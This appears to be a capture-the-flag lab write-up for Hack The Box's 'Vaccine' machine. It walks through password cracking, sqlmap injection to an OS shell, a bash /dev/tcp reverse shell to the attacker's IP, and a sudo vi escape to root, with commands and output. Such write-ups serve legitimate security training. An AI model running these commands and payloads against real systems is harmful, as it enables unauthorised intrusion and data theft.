#vulnerability-assessment #databases #custom-applications #protocols #source-code-analysis #apache #postgre-sql #ftp #php #reconnaissance #password-cracking #sudo-exploitation #sql-injection #remote-code-execution #clear-text-credentials #anonymous-access 

# 0. Theory

This exercise demonstrates how important enumeration is, and to combine multiple exploits in order to plan an effective attack vector on some targets.

**John the Ripper** is a free password cracking software tool. Originally developed for the Unix operating system, it can run on fifteen different platforms (eleven of which are architecture-specific versions of Unix, DOS, Win32, BeOS, and OpenVMS). It is among the most frequently used password testing and breaking programs as it combines a number of password crackers into one package, autodetects password hash types, and includes a customizable cracker. It can be run against various encrypted password formats including several crypt password hash types most commonly found on various Unix versions (based on DES, MD5, or Blowfish), Kerberos AFS, and Windows NT/2000/XP/2003 LM hash. Additional modules have extended its ability to include MD4-based password hashes and passwords stored in LDAP, MySQL, and others.

SQLmap is an open-source tool used in penetration testing to detect and exploit SQL injection flaws. SQLmap automates the process of detecting and exploiting SQL injection. SQL Injection attacks can take control of databases that utilize SQL.

# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ ping -c 4 10.129.95.174
	PING 10.129.95.174 (10.129.95.174) 56(84) bytes of data.
	64 bytes from 10.129.95.174: icmp_seq=1 ttl=63 time=8.32 ms
	64 bytes from 10.129.95.174: icmp_seq=2 ttl=63 time=7.94 ms
	64 bytes from 10.129.95.174: icmp_seq=3 ttl=63 time=8.23 ms
	64 bytes from 10.129.95.174: icmp_seq=4 ttl=63 time=8.55 ms
	
	--- 10.129.95.174 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3002ms
	rtt min/avg/max/mdev = 7.935/8.257/8.551/0.220 ms


# 2. Enumeration

We start off with the usual `nmap` scan.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ nmap -sC -sV 10.129.95.174
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 11:28 CDT
	Nmap scan report for 10.129.95.174
	Host is up (0.010s latency).
	Not shown: 997 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.10.14.125
	|      Logged in as ftpuser
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 3
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
	|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
	|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	|_http-title: MegaCorp Login
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds


There are three ports open: `21 FTP`, `22 SSH`, and `80 HTTP`. Since we don't have any credentials for the `SSH` service, we will start off with enumeration of the `port 21`, since the Nmap shows that the `FTP` service allows anonymous login:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ ftp 10.129.95.174
	Connected to 10.129.95.174.
	220 (vsFTPd 3.0.3)
	Name (10.129.95.174:root): anonymous
	331 Please specify the password.
	Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> dir
	229 Entering Extended Passive Mode (|||10062|)
	150 Here comes the directory listing.
	-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
	226 Directory send OK.

We verify from the `nmap` scan that there indeed is a `backup.zip` archive file available, so next we  download it.

	ftp> get backup.zip
	local: backup.zip remote: backup.zip
	229 Entering Extended Passive Mode (|||10069|)
	150 Opening BINARY mode data connection for backup.zip (2533 bytes).
	100% |**********************************************|  2533      898.84 KiB/s    00:00 ETA
	226 Transfer complete.
	2533 bytes received in 00:00 (229.72 KiB/s)
	ftp> exit
	221 Goodbye.

It will be located in the folder where we established the FTP connection.
We can extract it with the unzip command.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ unzip backup.zip
	Archive:  backup.zip
	[backup.zip] index.php password: 
	password incorrect--reenter: 
	password incorrect--reenter: 
	   skipping: index.php               incorrect password
	[backup.zip] style.css password: 
	password incorrect--reenter: 
	password incorrect--reenter: 
	   skipping: style.css               incorrect password

After trying some common passwords, we have no success right away. But at least we can see the content of the zip file.

At his point we can use John the Ripper to try cracking the password. John the Ripper comes pre-installed with Parrot OS & Kali Linux, however, but it's also available from [its git repository](https://github.com/openwall/john), or via the following command:
`sudo apt install john`

We can check its usage with the `john --help` command.

In order to successfully crack the password, we will have to convert the zip file into the hash using the `zip2john` module that comes within John the Ripper:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ zip2john backup.zip > hashes
	ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
	ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
	NOTE: It is assumed that all files in each archive have the same password.
	If that is not the case, the hash may be uncrackable. To avoid this, use
	option -o to pick a file at a time.
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ ls
	backup.zip  Desktop    Downloads  Music    Pictures  Templates
	cacert.der  Documents  hashes     my_data  Public    Videos
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ cat hashes
	backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip

Now we can execute `john` by feeding the `rockyou.txt` wordlist to it on the hashes, but first we need to extract it on the Parrot OS under `/usr/share/wordlists/`:

`sudo gzip -d /usr/share/wordlists/rockyou.txt.gz`
`john -wordlist=/usr/share/wordlists/rockyou.txt hashes`

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ john -wordlist=/usr/share/wordlists/rockyou.txt hashes
	Using default input encoding: UTF-8
	Loaded 1 password hash (PKZIP [32/64])
	Will run 4 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	741852963        (backup.zip)     
	1g 0:00:00:00 DONE (2024-10-09 11:54) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed. 

After it's complete, we can see that the password for the zip file is `741852963`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ unzip backup.zip
	Archive:  backup.zip
	[backup.zip] index.php password: 
	  inflating: index.php               
	  inflating: style.css  

By reading the `index.php` file first, we immediately see an admin credential hardcoded in a function, but the password is hashed with MD5 algorithm.

```php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
```

For now, we have a credential `admin:2cb42f8734ea607eefed3b70af13bbd3` which we might be able to use later, but the password is hashed.
We can try to identify the hash type and crack it with the `hashcat`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ hashid 2cb42f8734ea607eefed3b70af13bbd3
	Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
	[+] MD2 
	[+] MD5 
	[+] MD4 
	[+] Double MD5 
	[+] LM 
	[+] RIPEMD-128 
	[+] Haval-128 
	[+] Tiger-128 
	[+] Skein-256(128) 
	[+] Skein-512(128) 
	[+] Lotus Notes/Domino 5 
	[+] Skype 
	[+] Snefru-128 
	[+] NTLM 
	[+] Domain Cached Credentials 
	[+] Domain Cached Credentials 2 
	[+] DNSSEC(NSEC3) 
	[+] RAdmin v2.x 

It provides a huge list of possible hashes. However, we will go with MD5 first, naturally.
First we put this hash into a text file (we name it hash), and then crack it with `hashcat`.

Relevant flags for this command (see `hashcat -h` for more info):

	-a, --attack-mode : Attack-mode, see references below
	-m, --hash-type : Hash-type, references below (otherwise autodetect)
	==============
	[ Hash modes ]
	   0 | MD5
	================
	[ Attack Modes ]
	  0 | Straight
	  1 | Combination
	  3 | Brute-force
	  6 | Hybrid Wordlist + Mask
	  7 | Hybrid Mask + Wordlist
	  9 | Association

Hashcat in work:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 
	hashcat (v6.2.6) starting
	
	OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
	==================================================================================================================================================
	* Device #1: pthread-haswell-AMD EPYC 7542 32-Core Processor, skipped
	
	OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
	==================================================================
	* Device #2: AMD EPYC 7542 32-Core Processor, 3919/7902 MB (987 MB allocatable), 4MCU
	
	Minimum password length supported by kernel: 0
	Maximum password length supported by kernel: 256
	
	Hashes: 1 digests; 1 unique digests, 1 unique salts
	Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
	Rules: 1
	
	Optimizers applied:
	* Zero-Byte
	* Early-Skip
	* Not-Salted
	* Not-Iterated
	* Single-Hash
	* Single-Salt
	* Raw-Hash
	
	ATTENTION! Pure (unoptimized) backend kernels selected.
	Pure kernels can crack longer passwords, but drastically reduce performance.
	If you want to switch to optimized kernels, append -O to your commandline.
	See the above message to find out about the exact limits.
	
	Watchdog: Hardware monitoring interface not found on your system.
	Watchdog: Temperature abort trigger disabled.
	
	Host memory required for this attack: 1 MB
	
	Dictionary cache built:
	* Filename..: /usr/share/wordlists/rockyou.txt
	* Passwords.: 14344392
	* Bytes.....: 139921507
	* Keyspace..: 14344385
	* Runtime...: 1 sec
	
	2cb42f8734ea607eefed3b70af13bbd3:qwerty789                
	                                                          
	Session..........: hashcat
	Status...........: Cracked
	Hash.Mode........: 0 (MD5)
	Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3
	Time.Started.....: Wed Oct  9 12:09:52 2024 (0 secs)
	Time.Estimated...: Wed Oct  9 12:09:52 2024 (0 secs)
	Kernel.Feature...: Pure Kernel
	Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
	Guess.Queue......: 1/1 (100.00%)
	Speed.#2.........:  2409.4 kH/s (0.24ms) @ Accel:512 Loops:1 Thr:1 Vec:8
	Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
	Progress.........: 100352/14344385 (0.70%)
	Rejected.........: 0/100352 (0.00%)
	Restore.Point....: 98304/14344385 (0.69%)
	Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
	Candidate.Engine.: Device Generator
	Candidates.#2....: Dominic1 -> paashaas
	
	Started: Wed Oct  9 12:09:43 2024
	Stopped: Wed Oct  9 12:09:53 2024


We get the password `qwerty789` for the `admin` username.
And with that, we start enumerating the web service in our browser on `port 80`.
We find a login page.

![[Pasted image 20241009191323.png]]

We use the previously cracked credential `admin:qwerty789`, and we log in successfully.

![[Pasted image 20241009191601.png]]


## 3. Foothold

The dashboard we see has nothing special in it, but it has a catalogue, which might be connected with the database.
We can try creating any query.

![[Pasted image 20241009192039.png]]

By checking the URL, we can see that there is a variable `$search` which is responsible for searching through the catalogue. We could test it to see if it's vulnerable to SQL injection, but instead of doing it manually, we will use a tool called `sqlmap`.

`sqlmap` comes pre-installed with Parrot OS and Kali Linux, but can also be installed with the following command:
`sudo apt install sqlmap`

Check the `sqlmap -h` to see how to use it.

We will provide the URL & the cookie to the `sqlmap` in order for it to find vulnerability. We have to provide a cookie because of authentication.

To grab the cookie, we can intercept any request in Burp Suite & get it from there, however, for more convenience, we can install an extension for our web browser called `cookie-editor`:

For Google Chrome: https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm
For Firefox: https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/

The cookies in HTTP messages of requests are usually set the following way: `PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1`
We can check our cookie on the admin dashboard site in the browser as well.

![[Pasted image 20241009212647.png]]

Knowing that, here's how our sqlmap syntax should look:
`sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=tb46fl1cn23p95a0qfmscummds"`

> *Note: There will be some questions that the tool will ask you, you can respond with 'Y ' or 'N', or just by pressing ENTER for the default answer*

We run `sqlmap`:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ sqlmap -u "http://10.129.95.174/dashboard.php?search=any+query" --cookie="PHPSESSID=tb46fl1cn23p95a0qfmscummds"
	        ___
	       __H__
	 ___ ___[(]_____ ___ ___  {1.8.3#stable}
	|_ -| . ["]     | .'| . |
	|___|_  [']_|_|_|__,|  _|
	      |_|V...       |_|   https://sqlmap.org
	
	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	
	[*] starting @ 14:29:42 /2024-10-09/
	
	[14:29:43] [INFO] testing connection to the target URL
	[14:29:43] [INFO] checking if the target is protected by some kind of WAF/IPS
	[14:29:43] [INFO] testing if the target URL content is stable
	[14:29:43] [INFO] target URL content is stable
	[14:29:43] [INFO] testing if GET parameter 'search' is dynamic
	[14:29:43] [WARNING] GET parameter 'search' does not appear to be dynamic
	[14:29:43] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
	[14:29:43] [INFO] testing for SQL injection on GET parameter 'search'
	it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
	for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
	[14:29:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
	[14:29:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
	[14:29:58] [INFO] testing 'Generic inline queries'
	[14:29:58] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
	[14:29:58] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
	[14:29:58] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
	[14:29:58] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
	[14:29:58] [INFO] testing 'PostgreSQL inline queries'
	[14:29:58] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
	[14:29:58] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)                     
	[14:30:01] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
	[14:30:01] [WARNING] turning off pre-connect mechanism because of connection reset(s)
	[14:30:01] [WARNING] there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests
	[14:30:01] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
	[14:30:01] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
	[14:30:01] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
	[14:30:01] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
	[14:30:01] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
	[14:30:01] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
	[14:30:11] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
	[14:30:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
	GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
	sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
	---
	Parameter: search (GET)
	    Type: boolean-based blind
	    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
	    Payload: search=any query' AND (SELECT (CASE WHEN (5839=5839) THEN NULL ELSE CAST((CHR(82)||CHR(89)||CHR(90)||CHR(97)) AS NUMERIC) END)) IS NULL-- Rmqo
	
	    Type: error-based
	    Title: PostgreSQL AND error-based - WHERE or HAVING clause
	    Payload: search=any query' AND 8208=CAST((CHR(113)||CHR(106)||CHR(118)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (8208=8208) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC)-- xsFY
	
	    Type: time-based blind
	    Title: PostgreSQL > 8.1 AND time-based blind
	    Payload: search=any query' AND 1049=(SELECT 1049 FROM PG_SLEEP(5))-- YUFR
	---
	[14:30:13] [INFO] the back-end DBMS is PostgreSQL
	web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (eoan or focal)
	web application technology: Apache 2.4.41
	back-end DBMS: PostgreSQL
	[14:30:13] [INFO] fetched data logged to text files under '/home/scrage/.local/share/sqlmap/output/10.129.95.174'
	[14:30:13] [WARNING] your sqlmap version is outdated
	
	[*] ending @ 14:30:13 /2024-10-09/


The important part of this output for us is the following:

	GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

The tool confirmed that the target is vulnerable to SQL injection, which is everything we needed to know. We will run the `sqlmap` once more, where we are going to provide the `--os-shell` flag, where we will be able to perform command injection.

	sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=tb46fl1cn23p95a0qfmscummds" --os-shell

![[Pasted image 20241009215739.png]]

We get a shell terminal, but the connection is very unstable.
If it doesn't even yield a shell connection for the above command with the `--os-shell` flag, then we should run the command with the `--flush-session` flag first, instead:

	sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=tb46fl1cn23p95a0qfmscummds" --flush-session

### Reverse Shell
In order to establish a more reliable and interactive shell connection, first we start up a `netcat` listener on `port 443` in another terminal:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.125]─[scrage@htb-mxqxz6ugjh]─[~]
	└──╼ [★]$ sudo nc -lnvp 443
	listening on [any] 443 ...

Then we execute the following payload in the acquired os-shell:
```bash
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```

and we press enter for default response to the question it prompts to us.

	os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.125/443 0>&1"
	do you want to retrieve the command standard output? [Y/n/a] 
	[15:04:00] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
	[15:04:00] [WARNING] the SQL query provided does not return any output
	[15:04:00] [WARNING] time-based comparison requires larger statistical model, please wait......................... (done) 
	[15:04:00] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
	
	[15:04:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
	No output
	os-shell> 

Then we check back at our netcat listener terminal and see if we got the connection.

	listening on [any] 443 ...
	connect to [10.10.14.125] from (UNKNOWN) [10.129.95.174] 54824
	bash: cannot set terminal process group (7016): Inappropriate ioctl for device
	bash: no job control in this shell
	postgres@vaccine:/var/lib/postgresql/11/main$ whoami
	whoami
	postgres
	postgres@vaccine:/var/lib/postgresql/11/main$ 

And indeed, we did.
We will quickly [make our shell fully interactive](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

The [pty module](https://docs.python.org/2/library/pty.html) lets us spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The user flag is located in the /var/lib/postresql directory:

	postgres@vaccine:/var/lib/postgresql$ ls
	ls
	11
	user.txt
	postgres@vaccine:/var/lib/postgresql$ cat user.txt
	cat user.txt
	ec9b13ca4d6229cd5cc1e09980965bf7

**User flag exfiltrated:** `ec9b13ca4d6229cd5cc1e09980965bf7`


## Privilege Escalation

We are user `postgres`, but we don't know the password for it, which means we cannot check our sudo privileges.

	postgres@vaccine:/var/lib/postgresql$ id  
	id
	uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
	postgres@vaccine:/var/lib/postgresql$ sudo -l
	sudo -l
	sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
	sudo: a password is required


We will try to find the password in the `/var/www/html` folder, since the machine uses both PHP and SQL, meaning that there should be credentials in clear text.

	postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
	cd /var/www/html
	postgres@vaccine:/var/www/html$ ls -la
	ls -la
	total 392
	drwxr-xr-x 2 root root   4096 Jul 23  2021 .
	drwxr-xr-x 3 root root   4096 Jul 23  2021 ..
	-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png
	-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css
	-rw-r--r-- 1 root root     50 Jan 30  2020 dashboard.js
	-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php
	-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php
	-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt
	-rw-r--r-- 1 root root   3274 Feb  3  2020 style.css

In the `dashboard.php`, we found the following:

	<?php
	session_start();
	if($_SESSION['login'] !== "true") {
	  header("Location: index.php");
	  die();
	}
	try {
	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
	}

So we now know that the password is `P@s5w0rd!`

By this stage, the session has died suddenly many times. Instead of re-doing the exploit all over again, after this point, we can use SSH to log in:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.53]─[scrage@htb-xcj4kww0p1]─[~]
	└──╼ [★]$ ssh postgres@10.129.95.174
	The authenticity of host '10.129.95.174 (10.129.95.174)' can't be established.
	ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.129.95.174' (ED25519) to the list of known hosts.
	postgres@10.129.95.174's password: P@s5w0rd!
	Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	  System information as of Wed 16 Oct 2024 06:15:55 PM UTC
	
	  System load:  0.0               Processes:             184
	  Usage of /:   31.8% of 8.73GB   Users logged in:       0
	  Memory usage: 18%               IP address for ens160: 10.129.95.174
	  Swap usage:   0%
	
	
	0 updates can be installed immediately.
	0 of these updates are security updates.
	
	
	The list of available updates is more than a week old.
	To check for new updates run: sudo apt update
	
	
	The programs included with the Ubuntu system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.
	
	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
	applicable law.
	
	postgres@vaccine:~$ 


We can type `sudo -l `this time to check what privileges we have.

	postgres@vaccine:~$ sudo -l
	[sudo] password for postgres: 
	Matching Defaults entries for postgres on vaccine:
	    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
	    XFILESEARCHPATH XUSERFILESEARCHPATH",
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
	    mail_badpass
	
	User postgres may run the following commands on vaccine:
	    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

We can see that we have `sudo` privileges to edit the `pg_hba.conf` file using vi by running `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`.
To see if we can abuse this privilege, we visit GTFOBins:
https://gtfobins.github.io/gtfobins/vi/#sudo

>*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
>
>`sudo vi -c ':!/bin/sh' /dev/null`

So we execute `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null`.

	postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null
	Sorry, user postgres is not allowed to execute '/bin/vi /etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null' as root on vaccine.

We are unable to execute the following command because `sudo` is restricted to only `/bin/vi /etc/postgresql/11/main/pg_hba.conf`.

But there's also an alternative way according to GTFOBins:

	vi
	:set shell=/bin/sh
	:shell

So we will execute that as well.
And with that, we managed to open the vi editor as the superuser, which has root privileges:

![[Pasted image 20241016202638.png]]

Now we will press the `:` button to set the instructions inside `Vi`:
`set shell=/bin/sh`

Next, we will open up the same instruction interface and type in the `shell` instruction.
It will exit the `Vi` editor and will give us a terminal prompt in with root privilege:

	# whoami
	root
	# id
	uid=0(root) gid=0(root) groups=0(root)

The root flag is located in the `/root` folder.
>*Note: We can type bash to switch to `/bin/bash` shell.*

	# cd /root
	# /bin/bash
	root@vaccine:~# ls
	pg_hba.conf  root.txt  snap
	root@vaccine:~# cat root.txt
	dd6e058e814260bc70e9bbdef2715849

**Root flag exfiltrated:** `dd6e058e814260bc70e9bbdef2715849`



https://www.hackthebox.com/achievement/machine/2057492/289
![[Pasted image 20241016203700.png]]